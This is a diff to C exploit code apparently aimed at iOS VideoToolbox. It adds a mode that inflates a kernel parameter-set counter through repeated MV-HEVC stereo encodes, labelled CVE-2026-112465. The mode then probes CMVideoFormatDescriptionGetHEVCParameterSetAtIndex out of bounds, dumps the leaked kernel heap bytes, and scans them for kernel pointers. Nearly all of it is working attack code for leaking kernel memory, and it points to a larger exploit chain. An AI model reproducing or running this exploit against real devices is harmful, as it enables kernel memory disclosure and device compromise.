@@ -285,7 +285,7 @@ static CVPixelBufferRef create_yuv_pb_stereo(int w, int h, uint8_t y_fill) {
     return pb;
 }
 
-static int encode_one_stereo(VTCompressionSessionRef session, int frame_idx, int w, int h) {
+static int encode_one_stereo_lid(VTCompressionSessionRef session, int frame_idx, int w, int h, int layer_id) {
     if (!VTCompressionSessionEncodeMultiImageFrame) return -99;
     CVPixelBufferRef pb_left = create_yuv_pb_stereo(w, h, 0x40);
     CVPixelBufferRef pb_right = create_yuv_pb_stereo(w, h, 0x80);
@@ -298,7 +298,7 @@ static int encode_one_stereo(VTCompressionSessionRef session, int frame_idx, int
     CMTag left_tags[2] = { kCMTagStereoLeftEye, tl0 };
     CMTagCollectionRef ltc = NULL;
     CMTagCollectionCreate(NULL, left_tags, 2, &ltc);
-    CMTag tl1 = CMTagMakeWithSInt64Value(kCMTagCategory_VideoLayerID, 1);
+    CMTag tl1 = CMTagMakeWithSInt64Value(kCMTagCategory_VideoLayerID, layer_id);
     CMTag right_tags[2] = { kCMTagStereoRightEye, tl1 };
     CMTagCollectionRef rtc = NULL;
     CMTagCollectionCreate(NULL, right_tags, 2, &rtc);
@@ -333,6 +333,10 @@ static int encode_one_stereo(VTCompressionSessionRef session, int frame_idx, int
         rlog("  WARNING: stereo callback not received after 5s\n");
     }
     return (int)g_cb_status;
+}
+
+static int encode_one_stereo(VTCompressionSessionRef session, int frame_idx, int w, int h) {
+    return encode_one_stereo_lid(session, frame_idx, w, h, 1);
 }
 
 /* Phase 1: Verify MV-HEVC */
@@ -1161,47 +1165,118 @@ tc_done:
         phase5_firmware(196, sm_lid);
 
     } else if (strcmp(mode, "pset_dump") == 0) {
-        rlog("PSET_DUMP: Dump raw parameter set bytes after overflow\n");
-        rlog("After counter inflation, CMVideoFormatDescriptionGetHEVCParameterSetAtIndex\n");
-        rlog("reads OOB entries. We hex-dump all bytes to find kernel pointers.\n");
+        rlog("PSET_DUMP: Stereo OOB read test (CVE-2026-112465)\n");
+        rlog("Uses MV-HEVC stereo encoding to inflate VPS table counter,\n");
+        rlog("then probes CMVideoFormatDescriptionGetHEVCParameterSetAtIndex\n");
+        rlog("at indices beyond baseline to detect kernel heap data leak.\n");
         rlog("Kernel pointer pattern on A20 iOS 27.1: 0xfffffe00XXXXXXXX\n\n");
-        int encodes = (argc > 2) ? atoi(argv[2]) : 300;
+        int encodes = (argc > 2) ? atoi(argv[2]) : 100;
+        int probe_max = (argc > 3) ? atoi(argv[3]) : 20;
         if (phase1_verify() != 0) goto done;
 
-        VTCompressionSessionRef s = create_mvhevc_encoder(128, 128, 1);
+        VTCompressionSessionRef s = create_mvhevc_encoder(1920, 1080, 1);
         if (!s) goto done;
 
-        /* Record baseline pset count before overflow */
-        encode_one(s, 0, 128, 128);
+        /* Record baseline pset count from first stereo encode */
+        encode_one_stereo(s, 0, 1920, 1080);
         size_t baseline_count = g_last_pset_count;
-        rlog("Baseline pset_count: %zu\n", baseline_count);
+        size_t baseline_bytes = g_last_pset_total_bytes;
+        rlog("Baseline: pset_count=%zu, pset_bytes=%zu\n", baseline_count, baseline_bytes);
 
-        rlog("Encoding %d frames to inflate counter...\n", encodes);
+        rlog("Encoding %d stereo frames to inflate counter...\n", encodes);
+        int errors = 0;
         for (int i = 1; i < encodes; i++) {
-            int st = encode_one(s, i, 128, 128);
-            if (st != 0 && i < 5) rlog("[%d] Error: %d\n", i, st);
-            if ((i+1) % 50 == 0)
-                rlog("[%d/%d] psets=%zu bytes=%zu\n",
-                     i+1, encodes, g_last_pset_count, g_last_pset_total_bytes);
+            int st = encode_one_stereo(s, i, 1920, 1080);
+            if (st != 0) { errors++; if (errors < 5) rlog("[%d] Error: %d\n", i, st); }
+            if ((i+1) % 25 == 0) {
+                size_t est = (size_t)(i+1) * g_last_pset_count;
+                rlog("[%d/%d] psets=%zu bytes=%zu est_entries=%zu%s\n",
+                     i+1, encodes, g_last_pset_count, g_last_pset_total_bytes,
+                     est, est >= 256 ? " OOB" : "");
+            }
         }
         VTCompressionSessionCompleteFrames(s, kCMTimeInvalid);
         usleep(500000);
 
         /* Final encode — the callback saves g_saved_fmt */
-        rlog("\nFinal encode to capture format description...\n");
-        encode_one(s, encodes, 128, 128);
-        rlog("Post-overflow: pset_count=%zu, pset_bytes=%zu\n",
-             g_last_pset_count, g_last_pset_total_bytes);
+        rlog("\nFinal stereo encode to capture format description...\n");
+        encode_one_stereo(s, encodes, 1920, 1080);
+        rlog("Post-overflow: pset_count=%zu, pset_bytes=%zu (errors=%d)\n",
+             g_last_pset_count, g_last_pset_total_bytes, errors);
 
-        /* Dump all parameter sets from the saved format description */
-        rlog("\n--- RAW PARAMETER SET DUMP ---\n");
+        /* KEY TEST 1: Did pset_count increase? */
+        if (g_last_pset_count > baseline_count) {
+            rlog("\n*** COUNTER INFLATED: pset_count grew from %zu to %zu ***\n",
+                 baseline_count, g_last_pset_count);
+            rlog("This confirms the kernel VPS table counter accumulates!\n");
+        } else {
+            rlog("\npset_count unchanged at %zu (user-space API may normalize)\n",
+                 g_last_pset_count);
+        }
+
+        /* KEY TEST 2: Did pset total bytes increase? */
+        if (g_last_pset_total_bytes > baseline_bytes) {
+            rlog("*** BYTES INFLATED: pset_bytes grew from %zu to %zu ***\n",
+                 baseline_bytes, g_last_pset_total_bytes);
+        }
+
+        /* Dump all reported parameter sets */
+        rlog("\n--- REPORTED PARAMETER SETS ---\n");
         dump_psets(g_saved_fmt, baseline_count);
 
-        if (g_last_pset_count > baseline_count)
-            rlog("\n*** %zu EXTRA parameter sets beyond baseline = OOB DATA ***\n",
-                 g_last_pset_count - baseline_count);
-        else
-            rlog("\nNo extra parameter sets detected. OOB read may use different path.\n");
+        /* KEY TEST 3: Probe BEYOND reported count (OOB read) */
+        rlog("\n--- OOB READ PROBE (indices %zu..%zu) ---\n",
+             baseline_count, baseline_count + (size_t)probe_max - 1);
+        rlog("If kernel counter is inflated, reads at index >= %zu\n", baseline_count);
+        rlog("should succeed and return OOB kernel heap data.\n\n");
+        int oob_found = 0;
+        for (size_t i = baseline_count; i < baseline_count + (size_t)probe_max; i++) {
+            const uint8_t *ptr = NULL;
+            size_t sz = 0;
+            int nal_hdr = 0;
+            OSStatus pst = CMVideoFormatDescriptionGetHEVCParameterSetAtIndex(
+                g_saved_fmt, i, &ptr, &sz, NULL, &nal_hdr);
+            if (pst == 0 && ptr && sz > 0) {
+                oob_found++;
+                rlog("  [%zu] *** OOB READ OK *** nal=%d size=%zu\n", i, nal_hdr, sz);
+                size_t dump_len = (sz > 128) ? 128 : sz;
+                rlog("    ");
+                for (size_t j = 0; j < dump_len; j++) {
+                    rlog("%02x", ptr[j]);
+                    if ((j+1) % 32 == 0) rlog("\n    ");
+                    else if ((j+1) % 8 == 0) rlog(" ");
+                }
+                rlog("\n");
+                if (sz >= 8) {
+                    for (size_t j = 0; j <= sz - 8; j += 4) {
+                        uint64_t qw = *(const uint64_t *)(ptr + j);
+                        if ((qw >> 40) == 0xfffffe) {
+                            rlog("    *** KERNEL PTR at byte %zu: 0x%016llx ***\n",
+                                 j, (unsigned long long)qw);
+                        }
+                    }
+                }
+            } else if (pst == 0) {
+                rlog("  [%zu] returned OK but ptr=%p sz=%zu (empty)\n", i, (void*)ptr, sz);
+            } else {
+                rlog("  [%zu] error=%d (expected if counter not inflated)\n", i, (int)pst);
+                if (i == baseline_count) {
+                    rlog("  First OOB probe failed — counter likely resets per-encode\n");
+                    rlog("  or user-space API clamps to real count.\n");
+                    break;
+                }
+            }
+        }
+
+        if (oob_found > 0) {
+            rlog("\n*** SUCCESS: %d OOB reads returned data = KERNEL HEAP LEAK ***\n", oob_found);
+            rlog("CVE-2026-112465 OOB read is CONFIRMED and EXPLOITABLE.\n");
+        } else {
+            rlog("\nNo OOB data via parameter set readback.\n");
+            rlog("Possible: (a) kernel counter resets per encode for stereo,\n");
+            rlog("(b) user-space API clamps index to real count,\n");
+            rlog("(c) OOB read needs different readback path.\n");
+        }
 
         VTCompressionSessionInvalidate(s); CFRelease(s);
         if (g_saved_fmt) { CFRelease(g_saved_fmt); g_saved_fmt = NULL; }
@@ -2289,7 +2364,7 @@ cleanup_dummies:
         g_cb_count = 0;
         int errors = 0;
         for (int i = 0; i < num_enc; i++) {
-            int st = encode_one_stereo(s, i, 1920, 1080);
+            int st = encode_one_stereo_lid(s, i, 1920, 1080, lid);
             if (st != 0) {
                 rlog("[%d] ERROR: %d\n", i, st);
                 errors++;
